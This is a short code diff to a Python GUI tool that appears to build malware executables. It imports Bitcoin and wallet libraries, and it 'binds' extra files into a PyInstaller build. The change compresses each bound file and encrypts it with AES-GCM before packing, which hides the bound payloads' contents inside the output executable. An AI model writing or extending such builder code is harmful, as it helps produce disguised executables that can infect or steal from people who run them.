@@ -5,7 +5,7 @@ from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, random, shutil, base64, fade, time, bit, os
+import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, random, shutil, base64, zlib, fade, time, bit, os
 
 customtkinter.set_appearance_mode("dark")
 
@@ -448,7 +448,14 @@ class App(customtkinter.CTk):
 
         for path in binder_files:
             filename = path.split("/")[-1]
-            shutil.copyfile(path, f'src\\temp\\binder_{filename}')
+
+            with open(path, "rb") as file:
+                file_data = zlib.compress(file.read())
+                file_data = aesgcm.encrypt(nonce, file_data, associated_data=None)
+
+            with open(f'src\\temp\\binder_{filename}', "wb") as file:
+                file.write(file_data)
+
             binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']
 
         if cast_file:
